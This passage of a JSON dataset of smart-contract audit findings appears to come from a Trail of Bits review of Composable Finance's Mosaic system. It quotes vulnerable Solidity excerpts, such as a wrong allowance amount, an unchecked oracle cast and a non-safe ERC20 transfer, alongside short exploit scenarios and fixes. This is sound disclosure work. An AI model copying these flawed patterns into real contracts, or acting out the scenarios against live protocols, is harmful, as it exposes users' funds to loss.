investmentB.token, liquidity, investmentA.amount, investmentB.amount, address ( this ), deadline ); IERC20Upgradeable(investmentA.token).safeTransfer(mosaicHolding, amountA); IERC20Upgradeable(investmentB.token).safeTransfer(mosaicHolding, amountB); } Figure 24.3: The withdrawInvestment function in SushiswapLiquidityProvider :90-113 Thus, any withdrawal request that requires the removal of liquidity from SushiswapLiquidityProvider will revert. Exploit Scenario Alice wishes to withdraw liquidity ( tokenA ) that she deposited into the Mosaic system. The MosaicHolding contract does not hold enough tokenA to cover the withdrawal and thus tries to withdraw tokenA from the SushiswapLiquidityProvider investment strategy. The request reverts, and Alices withdrawal request fails, leaving her unable to access her funds. Recommendations Short term, avoid depositing user liquidity into the SushiswapLiquidityProvider investment strategy. Long term, take the following steps:   Identify and implement one or more data structures that will reduce the technical debt resulting from the use of the InvestmentStrategy interface. Develop a more eective solution for covering withdrawals that does not consistently require withdrawing funds from other investment strategies.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "26. MosaicVault and MosaicHolding owner is controlled by a single private key ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The MosaicVault and MosaicHolding contracts manage many critical functionalities, such as those for rescuing funds, managing liquidity, and claiming rewards. The owner of these contracts is a single externally owned account (EOA). As mentioned in TOB-CMP-20 , this creates a single point of failure. Moreover, it makes the owner a high-value target for attackers and increases the incentives for the owner to act maliciously. If the private key is compromised, the system will be compromised too. Exploit Scenario Alice, the owner of the MosaicVault and MosaicHolding contracts, deploys the contracts. MosaicHolding eventually holds assets worth USD 20 million. Eve gains access to Alices machine, upgrades the implementations, pauses MosaicHolding , and drains all funds from the contract. Recommendations Short term, change the owner of the contracts from a single EOA to a multi-signature account. Long term, take the following steps:   Develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure. Assess the systems key management infrastructure and document the associated risks as well as an incident response plan.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "27. The relayer is a single point of failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "Because the relayer is a centralized service that is responsible for critical functionalities, it constitutes a single point of failure within the Mosaic ecosystem. The relayer is responsible for the following tasks:       Managing withdrawals across chains Managing transfers across chains Managing the accrued interest on all users investments Executing cross-chain message call requests Collecting fees for all withdrawals, transfers, and cross-chain message calls Refunding fees in case of failed transfers or withdrawals The centralized design and importance of the relayer increase the likelihood that the relayer will be targeted by an attacker. Exploit Scenario Eve, an attacker, is able to gain root access on the server that runs the relayer. Eve can then shut down the Mosaic system by stopping the relayer service. Eve can also change the source code to trigger behavior that can lead to the drainage of funds. Recommendations Short term, document an incident response plan and monitor exposed ports and services that may be vulnerable to exploitation. Long term, arrange an external security audit of the core and peripheral relayer source code. Additionally, consider implementing a decentralized relayer architecture more resistant to system takeovers.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "Although dependency scans did not yield a direct threat to the project under review, npm and yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. DoS risk created by cross-chain message call requests on certain networks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "Cross-chain message calls that are requested on a low-fee, low-latency network could facilitate a DoS, preventing other users from interacting with the system. If a user, through the MsgSender contract, sent numerous cross-chain message call requests, the relayer would have to act upon the emitted events regardless of whether they were legitimate or part of a DoS attack. Exploit Scenario Eve creates a theoretically innite series of transactions on Arbitrum, a low-fee, low-latency network. The internal queue of the relayer is then lled with numerous malicious transactions. Alice requests a cross-chain message call; however, because the relayer must handle many of Eves transactions rst, Alice has to wait an undened amount of time for her transaction to be executed. Recommendations Short term, create multiple queues that work across the various chains to mitigate this DoS risk. Long term, analyze the implications of the ability to create numerous message calls on low-fee networks and its impact on relayer performance.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Unimplemented getAmountsOut function in Balancer V2 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The getAmountsOut function in the BalancerV2Wrapper contract is unimplemented. The purpose of the getAmountsOut() function, shown in gure 12.1, is to allow users to know the amount of funds they will receive when executing a swap. Because the function does not invoke any functions on the Balancer Vault, a user must actually perform a swap to determine the amount of funds he or she will receive: function getAmountsOut ( address , address , uint256 , bytes calldata ) external pure override returns ( uint256 ) { return 0 ; } Figure 12.1: The getAmountsOut function in BalancerVaultV2Wrapper:43-50 Exploit Scenario Alice, a user of the Composable Finance vaults, wants to swap 100 USDC for DAI on Balancer. Because the getAmountsOut function is not implemented, she is unable to determine how much DAI she will receive before executing the swap. Recommendations Short term, implement the getAmountsOut function and have it call the queryBatchSwap function on the Balancer Vault. Long term, add unit tests for all functions to test all ows. Unit tests will detect incorrect function behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "28. Lack of events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "Several critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. For example, the setRelayer function, which is called in the MosaicVault contract to set the relayer address, does not emit an event providing conrmation of that operation to the contracts caller (gure 28.1). function setRelayer ( address _relayer ) external override onlyOwner { relayer = _relayer; } Figure 28.1: The setRelayer() function in MosaicVault:80-82 Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to take ownership of the MosaicVault contract. She then sets a new relayer address. Alice, a Composable Finance team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components. 30. Insu\u0000cient protection of sensitive information Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-CMP-30 Target: CrosslayerPortal/env , bribe-protocol/hardhat.config.ts",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Accrued interest is not attributable to the underlying investor on-chain ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "When an investor earns interest-bearing tokens by lending funds through Mosaics investment strategies, the tokens are not directly attributed to the investor by on-chain data. The claim() function, which can be called only by the owner of the MosaicHolding contract, is dened in the contract and used to redeem interest-bearing tokens from protocols such as Aave and Compound (gure 5.1). The underlying tokens of these protocols lending pools are provided by users who are interacting with the Mosaic system and wish to earn rewards on their idle funds. function claim ( address _investmentStrategy , bytes calldata _data) external override onlyAdmin validAddress(_investmentStrategy) { require (investmentStrategies[_investmentStrategy], \"ERR: STRATEGY NOT SET\" ); address rewardTokenAddress = IInvestmentStrategy(_investmentStrategy).claimTokens(_data); emit TokenClaimed(_investmentStrategy, rewardTokenAddress); } Figure 5.1: The claim function in MosaicHolding:270-279 During the execution of claim() , the internal claimTokens() function calls into the AaveInvestmentStrategy , CompoundInvestmentStrategy , or SushiswapLiquidityProvider contract, which eectively transfers its balance of the interest-bearing token directly to the MosaicHolding contract. Figure 5.2 shows the claimTokens() function call in AaveInvestmentStrategy . function claimTokens ( bytes calldata data) external override onlyInvestor returns ( address ) { address token = abi.decode(data, ( address )); ILendingPool lendingPool = ILendingPool(lendingPoolAddressesProvider.getLendingPool()); DataTypes.ReserveData memory reserve = lendingPool.getReserveData(token); IERC20Upgradeable(reserve.aTokenAddress).safeTransfer( mosaicHolding, IERC20Upgradeable(reserve.aTokenAddress).balanceOf( address ( this )) ); return reserve.aTokenAddress; } Figure 5.2: The c laimTokens function in AaveInvestmentStrategy:58-68 However, there is no identiable mapping or data structure attributing a percentage of those rewards to a given user. The o-chain relayer service is responsible for holding such mappings and rewarding users with the interest they have accrued upon withdrawal (see the r elayer bot assumptions in the Project Coverage section). Exploit Scenario Investors Alice and Bob, who wish to earn interest on their idle USDC, decide to use the Mosaic system to provide loans. Mosaic invests their money in Aaves lending pool for USDC. However, there is no way for the parties to discern their ownership stakes in the lending pool through the smart contract logic. The owner of the contract decides to call the claim() function and redeem all aUSDC associated with Alices and Bobs positions. When Bob goes to withdraw his funds, he has to trust that the relayer will send him his claim on the aUSDC without any on-chain verication. Recommendations Short term, consider implementing a way to identify the amount of each investors stake in a given investment strategy. Currently, the relayer is responsible for tracking all rewards. Long term, review the privileges and responsibilities of the relayer and architect a more robust solution for managing investments.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. User funds can become trapped in nonstandard token contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "If a users funds are transferred to a token contract that violates the ERC20 standard, the funds may become permanently trapped in that token contract. In the MsgReceiver contract, there are six calls to the transfer() function. See gure 6.1 for an example. function approveERC20TokenAndForwardCall( uint256 _feeAmount, address _feeToken, address _feeReceiver, address _token, uint256 _amount, bytes32 _id, address _contract, bytes calldata _data ) external payable onlyOwnerOrRelayer returns ( bool success, bytes memory returnData) { require ( IMsgReceiverFactory(msgReceiverFactory).whitelistedFeeTokens(_feeToken), \"Fee token is not whitelisted\" ); require (!forwarded[_id], \"call already forwared\" ); //approve tokens to _contract IERC20(_token).safeIncreaseAllowance(_contract, _amount); // solhint-disable-next-line avoid-low-level-calls (success, returnData) = _contract.call{value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require (balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; IERC20(_feeToken).transfer(_feeReceiver, _feeAmount); } Figure 6.1: The approveERC20TokenAndForwardCall function in MsgReceiver:98- When implemented in accordance with the ERC20 standard, the transfer() function returns a boolean indicating whether a transfer operation was successful. However, tokens that implement the ERC20 interface incorrectly may not return true upon a successful transfer, in which case the transaction will revert and the users funds will be locked in the token contract. Exploit Scenario Alice, the owner of the MsgReceiverFactory contract, adds a fee token that is controlled by Eve. Eves token contract incorrectly implements the ERC20 interface. Bob interacts with MsgReceiver and calls a function that executes a transfer to _feeReceiver , which is controlled by Eve. Because Eves fee token contract does not provide a return value, Bobs transfer reverts. Recommendations Short term, use safeTransfer() for token transfers and use the SafeERC20 library for interactions with ERC20 token contracts. Long term, develop a process for onboarding new fee tokens. Review our Token Integration Checklist for guidance on the onboarding process. References  Missing Return Value Bug",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Use of MsgReceiver to check _feeToken status leads to unnecessary gas consumption ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "Checking the whitelist status of a token only on the receiving end of a message call can lead to excessive gas consumption. As part of a cross-chain message call, all functions in the MsgReceiver contract check whether the token used for the payment to _feeReceiver ( _feeToken ) is a whitelisted token (gure 13.1). Tokens are whitelisted by the owner of the MsgReceiverFactory contract. function approveERC20TokenAndForwardCall( uint256 _feeAmount, address _feeToken, address _feeReceiver, address _token, uint256 _amount, bytes32 _id, address _contract, bytes calldata _data ) external payable onlyOwnerOrRelayer returns ( bool success, bytes memory returnData) { require ( IMsgReceiverFactory(msgReceiverFactory).whitelistedFeeTokens(_feeToken), \"Fee token is not whitelisted\" ); require (!forwarded[_id], \"call already forwared\" ); //approve tokens to _contract IERC20(_token).safeIncreaseAllowance(_contract, _amount); // solhint-disable-next-line avoid-low-level-calls (success, returnData) = _contract.call{value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require (balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; IERC20(_feeToken).transfer(_feeReceiver, _feeAmount); } Figure 13.1: The approveERC20TokenAndForwardCall function in M sgReceiver:98-123 This validation should be performed before the MsgSender contract emits the related event (gure 13.2). This is because the relayer will act upon the emitted event on the receiving chain regardless of whether _feeToken is set to a whitelisted token. function registerCrossFunctionCallWithTokenApproval( uint256 _chainId, address _destinationContract, address _feeToken, address _token, uint256 _amount, bytes calldata _methodData ) { external override nonReentrant onlyWhitelistedNetworks(_chainId) onlyUnpausedNetworks(_chainId) whenNotPaused bytes32 id = _generateId(); //shouldn't happen require (hasBeenForwarded[id] == false , \"Call already forwarded\" ); require (lastForwardedCall != id, \"Forwarded last time\" ); lastForwardedCall = id; hasBeenForwarded[id] = true ; emit ForwardCallWithTokenApproval( msg.sender , id, _chainId, _destinationContract, _feeToken , _token, _amount, _methodData ); } Figure 13.2: The registerCrossFunctionCallWithTokenApproval function in M sgSender:169-203 Exploit Scenario On Arbitrum, a low-fee network, Eve creates a theoretically innite series of transactions to be sent to MsgSender , with _feeToken set to a token that she knows is not whitelisted. The relayer relays the series of message calls to a MsgReceiver contract on Ethereum, a high-fee network, and all of the transactions revert. However, the relayer has to pay the intrinsic gas cost for each transaction, with no repayment, while allowing its internal queue to be lled up with malicious transactions. Recommendations Short term, move the logic for token whitelisting and validation to the MsgSender contract. Long term, analyze the implications of the ability to create numerous message calls on low-fee networks and its impact on relayer performance.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Active liquidity providers can set arbitrary _tokenOut values when withdrawing liquidity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "An active liquidity provider (LP) can move his or her liquidity into any token, even one that the LP controls. When a relayer acts upon a WithdrawRequest event triggered by an active LP, the MosaicVault contract checks only that the address of _tokenOut (the token being requested) is not the zero address (gure 14.1). Outside of that constraint, _tokenOut can eectively be set to any token, even one that might have vulnerabilities. function _withdraw( address _accountTo, uint256 _amount, address _tokenIn, address _tokenOut, uint256 _amountOutMin, WithdrawData calldata _withdrawData, bytes calldata _data ) internal onlyWhitelistedToken(_tokenIn) validAddress(_tokenOut) nonReentrant onlyOwnerOrRelayer whenNotPaused returns ( uint256 withdrawAmount) Figure 14.1: The signature of the _withdraw function in M osaicVault:404-419 This places the burden of ensuring the swaps success on the decentralized exchange, and, as the application grows, can lead to unintended code behavior. Exploit Scenario Eve, a malicious active LP, is able to trigger undened behavior in the system by setting _tokenOut to a token that is vulnerable to exploitation. Recommendations Short term, analyze the implications of allowing _tokenOut to be set to an arbitrary token. Long term, validate the assumptions surrounding the lack of limits on _tokenOut as the codebase grows, and review our Token Integration Checklist to identify any related pitfalls. References  imBTC Uniswap Hack",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Withdrawal assumptions may lead to transfers of an incorrect token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The CurveTricryptoStrategy contract manages liquidity in Curve pools and facilitates transfers of tokens between chains. While it is designed to work with one curve vault, the vault can be set to an arbitrary pool. Thus, the contract should not make assumptions regarding the pool without validation. Each pool contains an array of tokens specifying the tokens to withdraw from that pool. However, when the vault address is set in the constructor of CurveTricryptoConfig , the pools address is not checked against the TriCrypto pools address. The token at index 2 in the coins array is assumed to be wrapped ether (WETH), as indicated by the code comment shown in gure 15.1. If the conguration is incorrect, a dierent token may be unintentionally transferred. if (unwrap) { //unwrap LP into weth transferredToken = tricryptoConfig.tricryptoLPVault().coins( 2 ); [...] Figure 15.1: Part of the transferLPs function in CurveTricryptoStrategy .sol:377-379 Exploit Scenario The Curve pool array, coins , stores an address other than that of WETH in index 2. As a result, a user mistakenly sends the wrong token in a transfer. Recommendations Short term, have the constructor of CurveTricryptoConfig or the transferLPs function validate that the address of transferredToken is equal to the address of WETH. Long term, validate data from external contracts, especially data involved in the transfer of funds.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. Improper validation of Chainlink data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The latestRoundData function returns a signed integer that is coerced to an unsigned integer without checking that the value is positive. An overow (e.g., uint(-1) ) would result in drastic misrepresentation of the price and unexpected behavior. In addition, ChainlinkLib does not ensure the completeness or recency of round data, so pricing data may not reect recent changes. It is best practice to dene a window in which data is considered suciently recent (e.g., within a minute of the last update) by comparing the block timestamp to updatedAt . (, int256 price , , , ) = _aggregator.latestRoundData(); return uint256 (price); Figure 16.1: Part of the getCurrentTokenPrice function in ChainlinkLib.sol:113-114 Recommendations Short term, have latestRoundData and similar functions verify that values are non-negative before converting them to unsigned integers, and add an invariant require(updatedAt != 0 && answeredInRound == roundID) to ensure that the round has nished and that the pricing data is from the current round. Long term, dene a minimum update threshold and add the following check: require((block.timestamp - updatedAt <= minThreshold) && (answeredInRound == roundID)) .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "25. Incorrect safeIncreaseAllowance() amount can cause invest() calls to revert ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "Calls to make investments through Sushiswap can revert because the sushiSwapRouter may not have the token allowances needed to fulll the requests. The owner of the MosaicHolding contract is responsible for investing user-deposited funds in investment strategies. The contract owner does this by calling the contracts invest() function, which then calls makeInvestment() on the investment strategy meant to receive the funds (gure 25.1). function invest ( IInvestmentStrategy.Investment[] calldata _investments, address _investmentStrategy , bytes calldata _data ) external override onlyAdmin validAddress(_investmentStrategy) { require (investmentStrategies[_investmentStrategy], \"ERR: STRATEGY NOT SET\" ); uint256 investmentsLength = _investments.length; address contractAddress = address ( this ); for ( uint256 i ; i < investmentsLength; i++) { IInvestmentStrategy.Investment memory investment = _investments[i]; require (investment.amount != 0 && investment.token != address ( 0 ), \"ERR: TOKEN AMOUNT\" ); IERC20Upgradeable token = IERC20Upgradeable(investment.token); require (token.balanceOf(contractAddress) >= investment.amount, \"ERR: BALANCE\" ); token.safeApprove(_investmentStrategy, investment.amount); } uint256 mintedTokens = IInvestmentStrategy(_investmentStrategy).makeInvestment( _investments, _data ); emit FoundsInvested(_investmentStrategy, msg.sender , mintedTokens); } Figure 25.1: The invest function in MosaicHolding:190- To deposit funds into the SushiswapLiquidityProvider investment strategy, the contract must increase the sushiSwapRouter s approval limits to account for the tokenA and tokenB amounts to be transferred. However, tokenB s approval limit is increased only to the amount of the tokenA investment (gure 25.2). function makeInvestment (Investment[] calldata _investments, bytes calldata _data) external override onlyInvestor nonReentrant returns ( uint256 ) { Investment memory investmentA = _investments[ 0 ]; Investment memory investmentB = _investments[ 1 ]; IERC20Upgradeable tokenA = IERC20Upgradeable(investmentA.token); IERC20Upgradeable tokenB = IERC20Upgradeable(investmentB.token); tokenA.safeTransferFrom( msg.sender , address ( this ), investmentA.amount); tokenB.safeTransferFrom( msg.sender , address ( this ), investmentB.amount); tokenA.safeIncreaseAllowance( address (sushiSwapRouter), investmentA.amount); tokenB.safeIncreaseAllowance( address (sushiSwapRouter), investmentA.amount); ( uint256 deadline , uint256 minA , uint256 minB ) = abi.decode( _data, ( uint256 , uint256 , uint256 ) ); (, , uint256 liquidity ) = sushiSwapRouter.addLiquidity( investmentA.token, investmentB.token, investmentA.amount, investmentB.amount, minA, minB, address ( this ), deadline ); return liquidity; } Figure 25.2: The makeInvestment function in SushiswapLiquidityProvider : 52-85 If the amount of tokenB to be deposited is greater than that of tokenA , sushiSwapRouter will fail to transfer the tokens, and the transaction will revert. Exploit Scenario Alice, the owner of the MosaicHolding contract, wishes to invest liquidity in a Sushiswap liquidity pool. The amount of the tokenB investment is greater than that of tokenA . The sushiSwapRouter does not have the right token allowances for the transaction, and the investment request fails. Recommendations Short term, change the amount value used in the safeIncreaseAllowance() call from investmentA.amount to investmentB.amount . Long term, review the codebase to identify similar issues. Additionally, create a more extensive test suite capable of testing edge cases that may invalidate system assumptions.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "17. Incorrect check of token status in the providePassiveLiquidity function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "A passive LP can provide liquidity in the form of a token that is not whitelisted. The providePassiveLiquidity() function in MosaicVault is called by users who wish to participate in the Mosaic system as passive LPs. As part of the functions execution, it checks whether there is a ReceiptToken associated with the _tokenAddress input parameter (gure 17.1). This is equivalent to checking whether the token is whitelisted by the system. function providePassiveLiquidity( uint256 _amount, address _tokenAddress) external payable override nonReentrant whenNotPaused { require (_amount > 0 || msg.value > 0 , \"ERR: AMOUNT\" ); if ( msg.value > 0 ) { require ( vaultConfig.getUnderlyingIOUAddress(vaultConfig.wethAddress()) != address ( 0 ), \"ERR: WETH NOT WHITELISTED\" ); _provideLiquidity( msg.value , vaultConfig.wethAddress(), 0 ); } else { require (_tokenAddress != address ( 0 ), \"ERR: INVALID TOKEN\" ); require ( vaultConfig.getUnderlyingIOUAddress(_tokenAddress) != address ( 0 ), \"ERR: TOKEN NOT WHITELISTED\" ); _provideLiquidity(_amount, _tokenAddress, 0 ); } } Figure 17.1: The providePassiveLiquidity function in MosaicVault:127-149 However, providePassiveLiquidity() uses an incorrect function call to check the whitelist status. Instead of calling getUnderlyingReceiptAddress() , it calls getUnderlyingIOUAddress() . The same issue occurs in checks of WETH deposits. Exploit Scenario Eve decides to deposit liquidity in the form of a token that is whitelisted only for active LPs. The token provides a higher yield than the tokens whitelisted for passive LPs. This may enable Eve to receive a higher annual percentage yield on her deposit than other passive LPs in the system receive on theirs. Recommendations Short term, change the function called to validate tokenAddress and wethAddress from getUnderlyingIOUAddress() to getUnderlyingReceiptAddress() . Long term, take the following steps:    Review the codebase to identify similar errors. Consider whether the assumption that the same tokens will be whitelisted for both passive and active LPs will hold in the future. Create a more extensive test suite capable of testing edge cases that may invalidate system assumptions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "18. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The Composable Finance contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Composable Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "19. Lack of contract documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The codebases lack code documentation, high-level descriptions, and examples, making the contracts dicult to review and increasing the likelihood of user mistakes. The CrosslayerPortal codebase would benet from additional documentation, including on the following:       The logic responsible for setting the roles in the core and the reason for the manipulation of indexes The incoming function arguments and the values used on source chains and destination chains The arithmetic involved in reward calculations and the relayers distribution of tokens The checks performed by the o-chain components, such as the relayer and the rebalancing bot The third-party integrations The rebalancing arithmetic and calculations There should also be clear NatSpec documentation on every function, identifying the unit of each variable, the functions intended use, and the functions safe values. The documentation should include all expected properties and assumptions relevant to the aforementioned aspects of the codebase. Recommendations Short term, review and properly document the aforementioned aspects of the codebase. Long term, consider writing a formal specication of the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "21. Unnecessary complexity due to interactions with native and smart contract tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The Composable Finance code is needlessly complex and has excessive branching. Its complexity largely results from the integration of both ERC20s and native tokens (i.e., ether). Creating separate functions that convert native tokens to ERC20s and then interact with functions that must receive ERC20 tokens (i.e., implementing separation of concerns) would drastically simplify and optimize the code. This complexity is the source of many bugs and increases the gas costs for all users whether or not they need to distinguish between ERC20s and ether. It is best practice to make components as small as possible and to separate helpful but noncritical components into periphery contracts. This reduces the attack surface and improves readability. Figure 21.1 shows an example of complex code. if (tempData.isSlp) { IERC20(sushiConfig.slpToken()).safeTransfer( msg.sender , tempData.slpAmount ); [...] } else { //unwrap and send the right asset [...] if (tempData.isEth) { [...] } else { IERC20(sushiConfig.wethToken()).safeTransfer( Figure 21.1: Part of the withdraw function in SushiSlpStrategy.sol:L180-L216 Recommendations Short term, remove the native ether interactions and use WETH instead. Long term, minimize the function complexity by breaking functions into smaller units. Additionally, refactor the code with minimalism in mind and extend the core functionality into periphery contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "29. Use of legacy openssl version in CrosslayerPortal tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The CrosslayerPortal project uses a legacy version of openssl to run tests. While this version is not exposed in production, the use of outdated security protocols may be risky (gure 29.1). An unexpected error occurred: Error: error:0308010C:digital envelope routines::unsupported at new Hash (node:internal/crypto/hash:67:19) at Object.createHash (node:crypto:130:10) at hash160 (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:249:21 ) at HDKey.set (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:50:24) at Function.HDKey.fromMasterSeed (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:194:20 ) at deriveKeyFromMnemonicAndPath (~/CrosslayerPortal/node_modules/hardhat/src/internal/util/keys-derivation.ts:21:27) at derivePrivateKeys (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/util.ts:29:52) at normalizeHardhatNetworkAccountsConfig (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/util.ts:56:10) at createProvider (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/construction.ts:78:59) at ~/CrosslayerPortal/node_modules/hardhat/src/internal/core/runtime-environment.ts:80:28 { opensslErrorStack: [ 'error:03000086:digital envelope routines::initialization error' ], library: 'digital envelope routines', reason: 'unsupported', code: 'ERR_OSSL_EVP_UNSUPPORTED' } Figure 29.1: Errors agged in npx hardhat testing Recommendations Short term, refactor the code to use a new version of openssl to prevent the exploitation of openssl vulnerabilities. Long term, avoid using outdated or legacy versions of dependencies. 22. Commented-out and unimplemented conditional statements Severity: Undetermined Diculty: Low Type: Undened Behavior Finding ID: TOB-CMP-22 Target: apyhunter-tricrypto/contracts/sushiswap/SushiSlpStrategy.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "23. Error-prone NFT management in the Summoner contract ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The Summoner contracts ability to hold NFTs in a number of states may create confusion regarding the contracts states and the dierences between the contracts. For instance, the Summoner contract can hold the following kinds of NFTs:   NFTs that have been pre-minted by Composable Finance and do not have metadata attached to them Original NFTs that have been locked by the Summoner for minting on the destination chain  MosaicNFT wrapper tokens, which are copies of NFTs that have been locked and are intended to be minted on the destination chain As the system is scaled, the number of NFTs held by the Summoner , especially the number of pre-minted NFTs, will increase signicantly. Recommendations Simplify the NFT architecture; see the related recommendations in Appendix E .",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Lack of doc comments ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
